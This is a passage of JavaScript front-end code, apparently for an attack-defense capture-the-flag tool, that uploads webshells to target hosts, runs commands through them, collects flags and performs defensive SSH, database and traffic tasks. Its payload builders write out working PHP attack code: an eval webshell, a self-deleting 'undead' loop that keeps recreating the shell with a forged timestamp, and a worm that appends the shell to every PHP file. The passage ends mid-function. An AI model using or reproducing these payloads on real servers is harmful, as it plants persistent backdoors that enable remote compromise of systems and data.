      current: 0,
      total: Math.max(state.targets.length, 1),
      message: "任务已启动",
      time: new Date().toISOString()
    });
    setPage("threats");
    setThreatView("execute");
    appendLog("info", "Undead 上传已启动", state.latestTaskId, false);
    renderAll();
  } catch (error) {
    handleError("上传 Undead", error);
  }
}

async function uploadMd5() {
  try {
    await savePayloadConfig();
    const rows = await call(METHOD.attack.uploadMd5, getValue("payloadMd5Pass"), getValue("payloadMd5Field"), "");
    mergeOperationRows(rows, "MD5 上传");
    appendLog("success", "MD5 上传完成", `${Array.isArray(rows) ? rows.length : 0} 个结果`, false);
  } catch (error) {
    handleError("上传 MD5", error);
  }
}

async function uploadWorm() {
  try {
    await savePayloadConfig();
    const rows = await call(METHOD.attack.uploadWorm, getValue("payloadWormUrlPass"), getValue("payloadWormPass"));
    mergeOperationRows(rows, "Worm 上传");
    appendLog("success", "Worm 上传完成", `${Array.isArray(rows) ? rows.length : 0} 个结果`, false);
  } catch (error) {
    handleError("上传 Worm", error);
  }
}

// [已停用] 命令模板功能 - 保留代码供后续恢复
// function fillCommandTemplate(templateName) {
//   return templateName;
// }
async function runExecCommand() {
  const command = getValue("attackCommand").trim();
  if (!command) {
    handleError("命令执行", new Error("请输入命令"));
    return;
  }
  const shellType = getValue("execShellType") || "shell";
  try {
    let rows = [];
    switch (shellType) {
      case "undead":
        rows = await call(METHOD.attack.execUndead, command);
        break;
      case "md5":
        rows = await call(METHOD.attack.execMd5, "", getValue("payloadMd5Pass"), getValue("payloadMd5Field"), command);
        break;
      case "worm":
        rows = await call(METHOD.attack.execWorm, getValue("payloadWormUrlPass"), getValue("payloadWormPass"), command);
        break;
      default:
        rows = await call(METHOD.attack.execShell, command);
        break;
    }
    mergeOperationRows(rows, `命令执行 (${shellType})`);
    appendLog("success", "命令执行完成", `${Array.isArray(rows) ? rows.length : 0} 个结果`, false);
  } catch (error) {
    handleError("命令执行", error);
  }
}

async function queryTaskStatus(taskId, interactive = false) {
  if (!taskId) {
    if (interactive) {
      handleError("查询任务", new Error("请输入任务 ID"));
    }
    return;
  }
  try {
    const task = await call(METHOD.attack.getTaskStatus, taskId);
    if (!task) {
      if (interactive) {
        handleError("查询任务", new Error(`未找到任务 ${taskId}`));
      }
      return;
    }
    upsertTask({
      id: task.taskId,
      title: task.taskId,
      status: task.status,
      current: task.current,
      total: task.total,
      message: task.message || task.lastError || "",
      time: task.lastUpdated || task.startedAt || new Date().toISOString()
    });
    if (Array.isArray(task.results) && task.results.length > 0) {
      mergeOperationRows(task.results, task.taskId);
    }
    state.latestTaskId = task.taskId || state.latestTaskId;
    renderAll();
  } catch (error) {
    handleError("查询任务", error);
  }
}

async function fetchFlagsHTTP() {
  const pathTemplate = getValue("flagPath").trim() || "/flag";
  try {
    const rows = await call(METHOD.flag.fetchHttp, pathTemplate);
    mergeFlagRows(rows, "HTTP 取旗");
    appendLog("success", "HTTP 取旗完成", `${Array.isArray(rows) ? rows.length : 0} 个结果`, false);
  } catch (error) {
    handleError("HTTP 取旗", error);
  }
}

async function fetchFlagsByShell() {
  const pathTemplate = getValue("flagPath").trim() || "/flag";
  try {
    const rows = await call(
      METHOD.flag.fetchShell,
      pathTemplate,
      getValue("flagShellType") || "shell",
      getValue("flagUrlPass"),
      getValue("flagPass"),
      getValue("flagPostField"),
      getValue("flagCommand") || "cat /flag"
    );
    mergeFlagRows(rows, "Shell 取旗");
    appendLog("success", "Shell 取旗完成", `${Array.isArray(rows) ? rows.length : 0} 个结果`, false);
  } catch (error) {
    handleError("Shell 取旗", error);
  }
}

async function runDefenseAction(action, executor, normalizer) {
  const targets = requireCurrentSSHHost(action);
  if (!targets) {
    return;
  }
  try {
    const payload = await executor(targets);
    const rows = normalizer(action, payload);
    state.defenseRows = [...rows, ...state.defenseRows].slice(0, 300);
    appendLog("success", action, `${rows.length} 条结果`, false);
    renderAll();
  } catch (error) {
    handleError(action, error);
  }
}

async function restoreDefenseItem(action, methodId) {
  const targets = requireCurrentSSHHost(action);
  const path = getValue("restorePath").trim();
  if (!targets) {
    return;
  }
  if (!path) {
    handleError(action, new Error("请先填写恢复路径"));
    return;
  }
  try {
    const payload = await call(methodId, targets, path);
    const rows = normalizeStringResults(action, payload);
    state.defenseRows = [...rows, ...state.defenseRows].slice(0, 300);
    appendLog("warning", action, `${rows.length} 条结果`, false);
    renderAll();
  } catch (error) {
    handleError(action, error);
  }
}

async function changeDatabasePassword() {
  const targets = requireCurrentSSHHost("修改数据库密码");
  const password = getValue("dbPasswordNew").trim();
  if (!targets || !password) {
    handleError("修改数据库密码", new Error("请先建立 SSH 连接并填写新数据库密码"));
    return;
  }
  try {
    const payload = await call(METHOD.defense.changeDatabasePassword, targets, password);
    const rows = normalizeStringResults("修改数据库密码", payload);
    state.defenseRows = [...rows, ...state.defenseRows].slice(0, 300);
    appendLog("warning", "修改数据库密码", `${rows.length} 条结果`, false);
    renderAll();
  } catch (error) {
    handleError("修改数据库密码", error);
  }
}

async function changeSSHPasswords() {
  const targets = requireCurrentSSHHost("批量修改 SSH 密码");
  const username = getValue("sshUserForChange").trim() || "root";
  const port = getValue("sshPortForChange").trim() || "22";
  const newPassword = getValue("newPassword").trim();
  const oldPasswords = splitTextList(getValue("oldPasswords"));
  const maxConcurrency = parsePositiveInt(getValue("maxConcurrency"), 10);
  if (!targets || !newPassword || oldPasswords.length === 0) {
    handleError("批量修改 SSH 密码", new Error("请先建立 SSH 连接，并填写新密码和旧密码列表"));
    return;
  }
  try {
    const payload = await call(METHOD.service.changeSSHPasswords, targets, username, port, oldPasswords, newPassword, maxConcurrency);
    const rows = normalizeSSHPasswordResults("批量修改 SSH 密码", payload);
    state.defenseRows = [...rows, ...state.defenseRows].slice(0, 300);
    appendLog("warning", "批量修改 SSH 密码", `${rows.length} 条结果`, false);
    renderAll();
  } catch (error) {
    handleError("批量修改 SSH 密码", error);
  }
}

async function startRemoteCapture() {
  const targetsInput = requireCurrentSSHHost("开始抓流量");
  if (!targetsInput) {
    return;
  }
  try {
    const payload = await call(METHOD.monitor.startRemoteCapture, {
      targetsInput,
      interface: getValue("captureInterface").trim() || "any",
      filter: getValue("captureFilter").trim()
    });
    state.captureState = normalizeCaptureState(payload);
    appendLog("success", "开始抓流量", `目标: ${targetsInput}`, false);
    renderAll();
  } catch (error) {
    handleError("开始抓流量", error);
  }
}

async function stopRemoteCapture() {
  try {
    const payload = await call(METHOD.monitor.stopRemoteCapture);
    state.captureState = normalizeCaptureState(payload);
    appendLog("warning", "停止抓流量", "远程 tcpdump 会话已停止。", false);
    renderAll();
  } catch (error) {
    handleError("停止抓流量", error);
  }
}

async function refreshCapture() {
  try {
    await loadCaptureState();
    await loadCaptureHistory();
    renderAll();
  } catch (error) {
    handleError("刷新抓流量状态", error);
  }
}

async function readLatestLog() {
  try {
    const content = await call(METHOD.file.readLogFile);
    $("filePreview").textContent = content || "暂无日志内容。";
    setSelection("log-file", { name: "latest-log" }, content || "暂无日志内容。");
  } catch (error) {
    handleError("读取日志", error);
  }
}

function onAttackProgress(payload) {
  if (!payload?.taskId) {
    return;
  }
  state.latestTaskId = payload.taskId;
  upsertTask({
    id: payload.taskId,
    title: payload.taskId,
    status: payload.status || "running",
    current: payload.current || 0,
    total: payload.total || 0,
    message: payload.message || "",
    time: new Date().toISOString()
  });
  if (payload.status === "done") {
    queryTaskStatus(payload.taskId, false).catch((error) => handleError("查询任务结果", error));
  }
  renderAll();
}

function onCaptureEvent(payload) {
  if (!payload) {
    return;
  }
  if (payload.state) {
    state.captureState = normalizeCaptureState(payload.state);
  }
  if (payload.session) {
    mergeCaptureSession(payload.session);
  }
  if (payload.record) {
    const currentRecords = Array.isArray(state.captureState.records) ? state.captureState.records : [];
    state.captureState.records = [payload.record, ...currentRecords].slice(0, 300);
  }
  renderAll();
}

function onSSHState(payload) {
  state.sshState = normalizeSSHState(payload);
  renderAll();
}

function onTerminalOutput(payload) {
  if (!payload?.data) {
    return;
  }
  state.terminalOutput += stripAnsi(payload.data);
  if (state.terminalOutput.length > 240000) {
    state.terminalOutput = state.terminalOutput.slice(-200000);
  }
  renderTerminal();
}
function renderAll() {
  renderNavigation();
  renderPageMeta();
  renderStatusSummary();
  renderSSHStateList();
  renderTargetsTable();
  renderTaskTable();
  renderOperationTable();
  renderFlagTable();
  renderDefenseTable();
  renderRemoteFilesTable();
  renderCaptureSessionTable();
  renderTrafficTable();
  renderCaptureHistoryTable();
  renderOutputTable();
  renderTerminal();
  renderDrawer();
}

function renderNavigation() {
  document.querySelectorAll(".page").forEach((page) => {
    page.classList.toggle("active", page.id === `page-${state.currentPage}`);
  });
  document.querySelectorAll(".nav-item[data-page]").forEach((button) => {
    button.classList.toggle("active", button.dataset.page === state.currentPage);
  });
  toggleSubviewButtons("[data-overview-view]", state.overviewView, "overviewView");
  toggleSubviewButtons("[data-asset-view]", state.assetView, "assetView");
  toggleSubviewButtons("[data-threat-view]", state.threatView, "threatView");
  toggleSubviewButtons("[data-log-view]", state.logView, "logView");

  toggleSubview("overview-view-terminal", state.overviewView === "terminal");
  toggleSubview("overview-view-files", state.overviewView === "files");
  toggleSubview("asset-view-scope", state.assetView === "scope");
  toggleSubview("asset-view-config", state.assetView === "config");
  toggleSubview("threat-view-execute", state.threatView === "execute");
  toggleSubview("threat-view-flags", state.threatView === "flags");
  toggleSubview("threat-view-payloads", state.threatView === "payloads");
  toggleSubview("log-view-live", state.logView === "live");
  toggleSubview("log-view-history", state.logView === "history");
  toggleSubview("log-view-files", state.logView === "files");
}

function renderPageMeta() {
  const meta = PAGE_META[state.currentPage] || PAGE_META.overview;
  setText("pageKicker", meta.kicker);
  setText("pageTitle", meta.title);
  setText("pageSubtitle", meta.subtitle);
}

function renderStatusSummary() {
  setText("sideTargets", String(state.targets.length));
  setText("sideAlive", String(state.aliveTargets.size));
  setText("sideSSH", state.sshState.connected ? `${state.sshState.username}@${state.sshState.host}` : "未连接");
  setText("sideCapture", state.captureState.running ? "运行中" : "空闲");
  setText("sidebarUserHint", state.sshState.connected ? formatSSHState(state.sshState) : "等待 SSH 连接");

  setText("topSSHStatus", formatSSHState(state.sshState));
  setText("topTerminalStatus", state.sshState.terminalOpen ? "已启动" : "未启动");
  setText("topCaptureStatus", state.captureState.running ? "运行中" : "空闲");
  setText("topTaskStatus", state.latestTaskId || "空闲");
  setText("terminalSessionBadge", state.sshState.terminalOpen ? "已启动" : "未启动");
  setText("taskSummaryBanner", state.latestTaskId ? `最近任务：${state.latestTaskId}` : "最近任务：空闲");
  setText("configStatus", state.configState);
  setText("drawerPage", PAGE_META[state.currentPage]?.kicker || "总览");
  setText("drawerSSH", state.sshState.connected ? formatSSHState(state.sshState) : "未连接");
  setText("drawerCapture", state.captureState.running ? "运行中" : "空闲");
  setText("drawerTask", state.latestTaskId || "空闲");
  setText(
    "defenseScopeHint",
    state.sshState.connected
      ? `当前防守目标：${state.sshState.host}`
      : "请先建立 SSH 连接，防守动作会直接作用于当前 SSH 主机。"
  );
  setText(
    "captureScopeHint",
    state.sshState.connected
      ? `当前抓取目标：${state.sshState.host} 的入站流量`
      : "请先建立 SSH 连接，抓取当前 SSH 主机上的入站流量。"
  );

  setDisabled("sshDisconnectBtn", !state.sshState.connected);
  setDisabled("sshReconnectBtn", !state.sshState.host);
  setDisabled("terminalSendBtn", !state.sshState.terminalOpen);
}

function renderSSHStateList() {
  const items = [
    { title: "连接状态", detail: state.sshState.connected ? "已连接" : "未连接" },
    { title: "主机", detail: state.sshState.host || "-" },
    { title: "端口", detail: state.sshState.port || "22" },
    { title: "用户", detail: state.sshState.username || "root" },
    { title: "终端", detail: state.sshState.terminalOpen ? "已启动" : "未启动" },
    { title: "最近错误", detail: state.sshState.lastError || "无" }
  ];
  const container = $("sshStateList");
  if (!container) {
    return;
  }
  container.innerHTML = items.map((item) => `
    <div class="info-row">
      <span>${escapeHTML(item.title)}</span>
      <strong>${escapeHTML(item.detail)}</strong>
    </div>
  `).join("");
}

function renderTargetsTable() {
  const needle = getValue("targetFilter").trim().toLowerCase();
  const rows = state.targets
    .map((target) => ({
      target,
      alive: state.aliveTargets.has(target),
      shell: state.shellSuccessTargets.has(target) ? "success" : state.shellErrorTargets.has(target) ? "error" : "neutral"
    }))
    .filter((row) => !needle || `${row.target} ${row.alive ? "online" : "offline"} ${row.shell}`.toLowerCase().includes(needle));

  renderTable(
    "targetsTable",
    [
      { label: "目标", html: (row) => escapeHTML(row.target) },
      { label: "在线", html: (row) => statusChipHtml(row.alive ? "success" : "neutral", row.alive ? "在线" : "未知") },
      { label: "Shell", html: (row) => statusChipHtml(row.shell, row.shell === "success" ? "可用" : row.shell === "error" ? "失败" : "未测") }
    ],
    rows,
    "暂无目标数据。",
    {
      onSelect: (row) => setSelection("target", row, JSON.stringify(row, null, 2))
    }
  );
}

function renderTaskTable() {
  renderTable(
    "taskTable",
    [
      { label: "任务 ID", html: (row) => escapeHTML(row.id) },
      { label: "状态", html: (row) => statusChipHtml(row.status, statusLabel(row.status)) },
      { label: "进度", html: (row) => escapeHTML(`${row.current}/${row.total || 0}`) },
      { label: "信息", html: (row) => escapeHTML(row.message || "") }
    ],
    state.taskFeed,
    "暂无任务记录。",
    {
      onSelect: (row) => setSelection("task", row, JSON.stringify(row, null, 2))
    }
  );
}

function renderOperationTable() {
  renderTable(
    "operationTable",
    [
      { label: "目标", html: (row) => escapeHTML(row.target || "-") },
      { label: "状态", html: (row) => statusChipHtml(row.success ? "success" : "error", row.success ? "成功" : "失败") },
      { label: "输出", html: (row) => escapeHTML(row.output || "无回显") },
      { label: "说明", html: (row) => escapeHTML(row.message || row.source || "") }
    ],
    state.operationRows,
    "暂无命令执行结果。",
    {
      onSelect: (row) => setSelection("operation", row, `${row.target}\n\n${row.output || "无回显"}\n\n${row.message || ""}`)
    }
  );
}

function renderFlagTable() {
  renderTable(
    "flagTable",
    [
      { label: "目标", html: (row) => escapeHTML(row.target || "-") },
      { label: "状态", html: (row) => statusChipHtml(row.success ? "success" : "error", row.success ? "成功" : "失败") },
      { label: "Flag", html: (row) => escapeHTML(row.flag || "-") },
      { label: "说明", html: (row) => escapeHTML(row.message || row.source || "") }
    ],
    state.flagRows,
    "暂无 Flag 结果。",
    {
      onSelect: (row) => setSelection("flag", row, `${row.target}\n\n${row.flag || row.message || ""}`)
    }
  );
}

function renderDefenseTable() {
  renderTable(
    "defenseTable",
    [
      { label: "动作", html: (row) => escapeHTML(row.action || "-") },
      { label: "目标", html: (row) => escapeHTML(row.target || "-") },
      { label: "状态", html: (row) => statusChipHtml(row.status, statusLabel(row.status)) },
      { label: "说明", html: (row) => escapeHTML(row.message || "") }
    ],
    state.defenseRows,
    "暂无防守结果。",
    {
      onSelect: (row) => setSelection("defense", row, JSON.stringify(row, null, 2))
    }
  );
}
function renderRemoteFilesTable() {
  const rows = Array.isArray(state.remoteList?.entries) ? state.remoteList.entries : [];
  renderTable(
    "remoteFilesTable",
    [
      { label: "名称", html: (row) => `${row.isDir ? "📁" : "📄"} ${escapeHTML(row.name)}` },
      { label: "大小", html: (row) => escapeHTML(row.isDir ? "-" : formatBytes(row.size)) },
      { label: "权限", html: (row) => escapeHTML(row.mode || "-") },
      { label: "修改时间", html: (row) => escapeHTML(formatDateTime(row.modTime)) }
    ],
    rows,
    state.sshState.connected ? "当前目录没有条目。" : "SSH 未连接。",
    {
      onSelect: (row) => selectRemoteEntry(row),
      onDoubleClick: (row) => {
        if (row.isDir) {
          loadRemoteDirectory(row.path).catch((error) => handleError("打开目录", error));
          return;
        }
        openSelectedRemoteFileEditor().catch((error) => handleError("编辑远程文件", error));
      },
      isSelected: (row) => row.path === state.remoteSelected?.path
    }
  );
  $("remoteFilePreview").textContent = state.remotePreview;
  setText("remoteDropTarget", state.currentRemotePath || "/");
}

function renderCaptureSessionTable() {
  const rows = Array.isArray(state.captureState.sessions) ? state.captureState.sessions : [];
  renderTable(
    "captureSessionTable",
    [
      { label: "目标", html: (row) => escapeHTML(row.target || "-") },
      { label: "状态", html: (row) => statusChipHtml(row.status, statusLabel(row.status)) },
      { label: "信息", html: (row) => escapeHTML(row.message || row.lastLine || "") },
      { label: "最近活动", html: (row) => escapeHTML(formatDateTime(row.lastSeen)) }
    ],
    rows,
    "暂无抓流量会话。",
    {
      onSelect: (row) => setSelection("capture-session", row, JSON.stringify(row, null, 2))
    }
  );
}

function renderTrafficTable() {
  const rows = Array.isArray(state.captureState.records) ? state.captureState.records : [];
  renderTable(
    "trafficTable",
    [
      { label: "时间", html: (row) => escapeHTML(formatDateTime(row.timestamp)) },
      { label: "源 IP", html: (row) => escapeHTML(formatEndpoint(row.srcIp, row.srcPort)) },
      { label: "目的 IP", html: (row) => escapeHTML(formatEndpoint(row.dstIp, row.dstPort)) },
      { label: "协议", html: (row) => escapeHTML(row.protocol || "-") },
      { label: "摘要", html: (row) => escapeHTML(row.summary || "-") }
    ],
    rows,
    "暂无实时流量记录。",
    {
      onSelect: (row) => {
        const preview = formatTrafficPreview(row);
        $("trafficPreview").textContent = preview;
        setSelection("traffic-live", row, preview);
      }
    }
  );
}

function renderCaptureHistoryTable() {
  renderTable(
    "captureHistoryTable",
    [
      { label: "时间", html: (row) => escapeHTML(formatDateTime(row.timestamp)) },
      { label: "源 IP", html: (row) => escapeHTML(formatEndpoint(row.srcIp, row.srcPort)) },
      { label: "目的 IP", html: (row) => escapeHTML(formatEndpoint(row.dstIp, row.dstPort)) },
      { label: "协议", html: (row) => escapeHTML(row.protocol || "-") },
      { label: "摘要", html: (row) => escapeHTML(row.summary || "-") }
    ],
    state.captureHistory,
    "暂无抓包记录。",
    {
      onSelect: (row) => {
        const preview = formatTrafficPreview(row);
        $("captureHistoryPreview").textContent = preview;
        setSelection("traffic-history", row, preview);
      }
    }
  );
}

function renderOutputTable() {
  renderTable(
    "outputTable",
    [
      { label: "文件名", html: (row) => escapeHTML(row.name || "-") },
      { label: "大小", html: (row) => escapeHTML(row.isDir ? "-" : formatBytes(row.size)) },
      { label: "修改时间", html: (row) => escapeHTML(formatDateTime(row.modTime)) }
    ],
    state.files,
    "暂无输出文件。",
    {
      onSelect: (row) => readOutputFile(row)
    }
  );
}

function renderTerminal() {
  const node = $("terminalOutput");
  if (!node) {
    return;
  }
  node.textContent = state.terminalOutput || "连接成功后，终端输出会显示在这里。";
  requestAnimationFrame(() => {
    node.scrollTop = node.scrollHeight;
  });
}

function renderDrawer() {
  $("drawer")?.classList.toggle("open", state.drawerOpen);
  $("drawerBackdrop")?.classList.toggle("open", state.drawerOpen);
  document.querySelectorAll(".drawer-tab[data-tab]").forEach((button) => {
    button.classList.toggle("active", button.dataset.tab === state.drawerTab);
  });
  document.querySelectorAll(".drawer-panel").forEach((panel) => {
    panel.classList.toggle("active", panel.id === `drawer-${state.drawerTab}`);
  });
  $("drawerSelection").textContent = state.selectedRecord ? JSON.stringify(state.selectedRecord, null, 2) : "未选择任何记录。";
  $("drawerDetails").textContent = state.selectedDetails || "等待结果输出...";
  $("drawerLogs").textContent = state.logs.map((item) => `[${item.time}] [${item.level.toUpperCase()}] ${item.title}\n${item.detail}`).join("\n\n") || "等待事件...";
  $("drawerAlertDot")?.classList.toggle("active", !state.drawerOpen && state.logs.length > 0);
}
function syncInputsFromConfig() {
  const cfg = state.config || {};
  setValue("shellPort", cfg.shell?.port || "80");
  setValue("shellPass", cfg.shell?.pass || "");
  setValue("shellPath", cfg.shell?.path || "/");
  setValue("shellFile", cfg.shell?.file || "index.php");
  setValue("shellMethod", cfg.shell?.method || "POST");
  setValue("shellQuery", cfg.shell?.query || "");
  setValue("shellPayload", cfg.shell?.payload || "php");
  setValue("shellProxy", cfg.shell?.proxy || "");

  setValue("sshPath", cfg.ssh?.path || "/var/www/html");

  setValue("dbHost", cfg.database?.host || "");
  setValue("dbPort", cfg.database?.port || "3306");
  setValue("dbUsername", cfg.database?.username || "");
  setValue("dbPassword", cfg.database?.password || "");
  setValue("dbName", cfg.database?.name || "");

  setValue("payloadUndeadUrlPass", cfg.undeadHorse?.urlPass || "pass");
  setValue("payloadUndeadPass", cfg.undeadHorse?.pass || "pass");
  setValue("payloadUndeadFilename", cfg.undeadHorse?.filename || "favicon.php");
  setValue("payloadWormUrlPass", cfg.wormShell?.urlPass || "pass");
  setValue("payloadWormPass", cfg.wormShell?.pass || "pass");
  setValue("payloadMd5Pass", state.md5Settings.pass || cfg.undeadHorse?.pass || "pass");
  setValue("payloadMd5Field", state.md5Settings.field || cfg.shell?.pass || "pass");

  state.currentRemotePath = state.currentRemotePath || cfg.ssh?.path || "/";
}

function syncSSHModalInputs() {
  const cfg = state.config || {};
  setValue("sshConnectHost", state.sshState.host || cfg.ssh?.host || "");
  setValue("sshConnectPort", state.sshState.port || cfg.ssh?.port || "22");
  setValue("sshConnectUser", state.sshState.username || cfg.ssh?.username || "root");
  if (!getValue("sshConnectPassword")) {
    setValue("sshConnectPassword", cfg.ssh?.password || "");
  }
  setText("sshConnectStatus", state.sshState.connected ? `状态：已连接 ${formatSSHState(state.sshState)}` : "状态：等待连接...");
}

function normalizeSSHState(payload) {
  return {
    connected: Boolean(payload?.connected),
    host: payload?.host || "",
    port: payload?.port || "22",
    username: payload?.username || "root",
    connectedAt: payload?.connectedAt || "",
    lastError: payload?.lastError || "",
    terminalOpen: Boolean(payload?.terminalOpen)
  };
}

function normalizeCaptureState(payload) {
  return {
    running: Boolean(payload?.running),
    interface: payload?.interface || "",
    filter: payload?.filter || "",
    startedAt: payload?.startedAt || "",
    sessions: Array.isArray(payload?.sessions) ? payload.sessions : [],
    records: Array.isArray(payload?.records) ? payload.records : []
  };
}

function mergeOperationRows(rows, source) {
  const normalized = (Array.isArray(rows) ? rows : []).map((row) => ({
    target: row.target || "-",
    success: Boolean(row.success),
    output: row.output || "",
    message: row.message || "",
    source
  }));
  state.operationRows = [...normalized, ...state.operationRows].slice(0, 300);
  if (normalized[0]) {
    setSelection("operation", normalized[0], `${normalized[0].target}\n\n${normalized[0].output || "无回显"}`);
  }
  renderAll();
}

function mergeFlagRows(rows, source) {
  const normalized = (Array.isArray(rows) ? rows : []).map((row) => ({
    target: row.target || "-",
    flag: row.flag || "",
    success: Boolean(row.success),
    message: row.message || "",
    source
  }));
  state.flagRows = [...normalized, ...state.flagRows].slice(0, 300);
  if (normalized[0]) {
    setSelection("flag", normalized[0], normalized[0].flag || normalized[0].message || "");
  }
  renderAll();
}

function upsertTask(row) {
  const index = state.taskFeed.findIndex((item) => item.id === row.id);
  if (index >= 0) {
    state.taskFeed[index] = { ...state.taskFeed[index], ...row };
  } else {
    state.taskFeed.unshift(row);
  }
  state.taskFeed = state.taskFeed.slice(0, 120);
}

function mergeCaptureSession(session) {
  const rows = Array.isArray(state.captureState.sessions) ? [...state.captureState.sessions] : [];
  const index = rows.findIndex((item) => item.target === session.target);
  if (index >= 0) {
    rows[index] = { ...rows[index], ...session };
  } else {
    rows.unshift(session);
  }
  state.captureState.sessions = rows;
}

function normalizeStringResults(action, payload) {
  return (Array.isArray(payload) ? payload : []).map((item) => ({
    action,
    target: extractTargetFromLine(item),
    status: "done",
    message: String(item || "")
  }));
}

function normalizeShellFindings(action, payload) {
  return (Array.isArray(payload) ? payload : []).map((item) => ({
    action,
    target: item.target || "-",
    status: "warning",
    message: `${item.path || ""} ${item.reason || ""}`.trim()
  }));
}

function normalizeSSHPasswordResults(action, payload) {
  return (Array.isArray(payload?.results) ? payload.results : []).map((item) => ({
    action,
    target: item.ip || "-",
    status: item.status || "unknown",
    message: item.message || ""
  }));
}

function setSelection(kind, record, details) {
  state.selectedRecord = { kind, record };
  state.selectedDetails = details || JSON.stringify(record, null, 2);
  renderDrawer();
}

function formatTrafficPreview(row) {
  const lines = [
    `目标: ${row.target || "-"}`,
    `时间: ${formatDateTime(row.timestamp)}`,
    `方向: ${statusLabel(row.direction || "unknown")}`,
    `协议: ${row.protocol || "-"}`,
    `源: ${formatEndpoint(row.srcIp, row.srcPort)}`,
    `目的: ${formatEndpoint(row.dstIp, row.dstPort)}`
  ];

  if (row.method) {
    lines.push(`方法: ${row.method}`);
  }
  if (row.path) {
    lines.push(`路径: ${row.path}`);
  }
  if (row.status) {
    lines.push(`状态码: ${row.status}`);
  }

  lines.push("", row.raw || row.summary || "暂无原始内容。");
  return lines.join("\n");
}

function appendLog(level, title, detail, rerender = true) {
  state.logs.unshift({
    level,
    title,
    detail,
    time: new Date().toLocaleTimeString("zh-CN", { hour12: false })
  });
  state.logs = state.logs.slice(0, 200);
  if (rerender) {
    renderDrawer();
  }
}

function handleError(context, error) {
  appendLog("error", context, extractError(error), true);
  console.error(context, error);
}

function renderTable(containerId, columns, rows, emptyText, options = {}) {
  const container = $(containerId);
  if (!container) {
    return;
  }
  if (!Array.isArray(rows) || rows.length === 0) {
    container.innerHTML = `<div class="empty-state">${escapeHTML(emptyText)}</div>`;
    return;
  }
  const head = columns.map((column) => `<th>${escapeHTML(column.label)}</th>`).join("");
  const body = rows.map((row, index) => `
    <tr data-index="${index}" class="${options.isSelected?.(row) ? "is-selected" : ""}">
      ${columns.map((column) => `<td>${column.html ? column.html(row) : escapeHTML(String(row[column.key] ?? ""))}</td>`).join("")}
    </tr>
  `).join("");
  container.innerHTML = `<table><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table>`;
  container.querySelectorAll("tbody tr").forEach((rowNode) => {
    const row = rows[Number(rowNode.dataset.index)];
    rowNode.addEventListener("click", () => options.onSelect?.(row));
    rowNode.addEventListener("dblclick", () => options.onDoubleClick?.(row));
  });
}
function $(id) {
  return document.getElementById(id);
}

function getValue(id) {
  return $(id)?.value ?? "";
}

function setValue(id, value) {
  if ($(id)) {
    $(id).value = value ?? "";
  }
}

function setText(id, value) {
  if ($(id)) {
    $(id).textContent = value ?? "";
  }
}

function setDisabled(id, disabled) {
  if ($(id)) {
    $(id).disabled = Boolean(disabled);
  }
}

function toggleSubview(id, active) {
  $(id)?.classList.toggle("active", Boolean(active));
}

function toggleSubviewButtons(selector, currentValue, dataKey) {
  document.querySelectorAll(selector).forEach((button) => {
    button.classList.toggle("active", button.dataset[dataKey] === currentValue);
  });
}

function parseTargetsInput() {
  const rows = getValue("targetsInput")
    .replace(/,/g, "\n")
    .split(/\r?\n/)
    .map((item) => item.trim())
    .filter(Boolean);
  const expanded = [];
  for (const row of rows) {
    expanded.push(...expandTargetEntry(row));
  }
  return uniqueArray(expanded);
}

function splitTextList(value) {
  return uniqueArray(
    String(value || "")
      .replace(/,/g, "\n")
      .split(/\r?\n/)
      .map((item) => item.trim())
      .filter(Boolean)
  );
}

function getOwnIPsValue(_source = "defense") {
  return state.sshState.connected ? (state.sshState.host || "").trim() : "";
}

async function saveOwnIPsValue(value, silent = false) {
  const ownIPs = String(value || "").trim();
  if (!ownIPs) {
    return;
  }
  await call(METHOD.config.updateOwnIPs, ownIPs);
  state.config = { ...(state.config || {}), ownIPs };
  if (!silent) {
    appendLog("success", "本机 IP 已更新", ownIPs, false);
  }
}

function requireCurrentSSHHost(action) {
  const host = getOwnIPsValue();
  if (host) {
    return host;
  }
  handleError(action, new Error("请先建立 SSH 连接"));
  return "";
}

function buildDefaultMd5Payload() {
  const pass = phpSingleQuote(getValue("payloadMd5Pass") || state.config?.undeadHorse?.pass || "pass");
  const field = phpSingleQuote(getValue("payloadMd5Field") || state.config?.shell?.pass || "pass");
  return `<?php if(md5($_GET['pass'])==md5('${pass}')){@eval($_POST['${field}']);}?>`;
}

function buildDefaultUndeadPayload() {
  const filename = phpSingleQuote((getValue("payloadUndeadFilename") || state.config?.undeadHorse?.filename || "favicon.php").replace(/^\/+/, ""));
  const encoded = base64Encode(buildDefaultMd5Payload());
  return `<?php
error_reporting(0);
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);

$file = __DIR__ . '/${filename}';
$code = base64_decode('${encoded}');
while(true) {
    if(!file_exists($file) || md5(file_get_contents($file))!==md5($code)) {
        file_put_contents($file, $code);
    }
    @chmod($file, 0777);
    touch($file, mktime(20,15,1,11,28,2021));
    usleep(100);
}
?>`;
}

function buildDefaultWormPayload() {
  const encoded = base64Encode(buildDefaultMd5Payload());
  return `<?php
$payload = base64_decode('${encoded}');
$count = 0;
$rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(__DIR__));
foreach ($rii as $file) {
    if ($file->isDir()) { continue; }
    $filepath = $file->getPathname();
    if (substr($filepath, -4) !== '.php') { continue; }
    if (substr($filepath, -13) === '.template.php') { continue; }
    $content = @file_get_contents($filepath);
    if ($content === false) { continue; }
    if (strpos($content, $payload) !== false) { continue; }
    if (@file_put_contents($filepath, $content . "\n" . $payload) !== false) {
        $count++;
        echo "success " . $filepath . " intofile\n";
    }
}
echo "total " . $count . " files infected\n";
@unlink(__FILE__);
?>`;
}

function phpSingleQuote(value) {
  return String(value || "").replace(/\\/g, "\\\\").replace(/'/g, "\\'");
}

function base64Encode(value) {
  return btoa(unescape(encodeURIComponent(value)));
}

async function safeReadOutputFile(path) {
  try {
    return await call(METHOD.file.readOutputFile, path);
  } catch (_) {
    return "";
  }
}

async function readOutputFile(row) {
  if (!row?.path && !row?.name) {
    return;
  }
  try {
    const content = await call(METHOD.file.readOutputFile, row.path || row.name);
    $("filePreview").textContent = content || "文件为空。";
    setSelection("output-file", row, content || "文件为空。");
  } catch (error) {
    handleError("读取输出文件", error);
  }
}

function extractError(error) {
  if (!error) {
    return "unknown error";
  }
  if (typeof error === "string") {
    return error;
  }
  if (typeof error?.message === "string") {
    return error.message;
  }
  try {
    return JSON.stringify(error);
  } catch (_) {
    return String(error);
  }
}

function statusLabel(status) {
  const normalized = String(status || "").toLowerCase();
  switch (normalized) {
    case "success":
    case "passed":
    case "done":
      return "成功";
    case "error":
    case "failed":
